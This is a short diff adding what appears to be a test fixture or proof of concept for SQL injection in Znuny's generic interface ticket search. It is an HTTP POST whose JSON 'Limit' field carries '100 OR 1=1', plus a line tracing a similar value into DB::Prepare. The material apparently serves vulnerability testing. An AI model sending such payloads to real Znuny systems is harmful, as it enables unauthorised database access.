@@ -1,0 +1,4 @@
+POST /znuny/nph-genericinterface.pl/Webservice/GTCR_ed91ae2f/Ticket/Search
+{"UserLogin":"root@localhost","Password":"...","Title":"%","Limit":"100 OR 1=1"}
+
+sink: DB::Prepare(SQL=>'SELECT id FROM ticket', Limit=>'424242 OR 7=7')
